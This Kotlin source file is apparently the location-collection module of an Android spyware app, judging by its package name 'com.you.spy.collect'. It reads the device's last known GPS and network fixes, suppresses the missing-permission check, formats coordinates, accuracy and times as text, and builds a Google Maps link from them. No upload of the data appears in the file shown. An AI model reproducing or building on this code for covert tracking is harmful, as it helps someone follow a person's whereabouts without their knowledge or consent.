package com.you.spy.collect

import android.annotation.SuppressLint
import android.content.Context
import android.location.LocationManager
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext

object Location {

    @SuppressLint("MissingPermission")
    suspend fun best(ctx: Context): String = withContext(Dispatchers.IO) {
        val lm = ctx.getSystemService(Context.LOCATION_SERVICE) as LocationManager
        val out = StringBuilder()

        runCatching {
            val last = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER)
                ?: lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
            if (last != null) {
                out.appendLine("last: ${last.latitude}, ${last.longitude}")
                out.appendLine("acc: ${last.accuracy}m  time: ${last.time}")
            }
        }

        val providers = lm.getProviders(true)
        providers.forEach { p ->
            runCatching {
                val l = lm.getLastKnownLocation(p)
                if (l != null) out.appendLine("$p: ${l.latitude}, ${l.longitude} @${l.accuracy}m")
            }
        }

        if (out.isEmpty()) "no fix (location off?)" else out.toString()
    }

    fun mapLink(lat: Double, lon: Double) =
        "https://www.google.com/maps/search/?api=1&query=$lat,$lon"
}
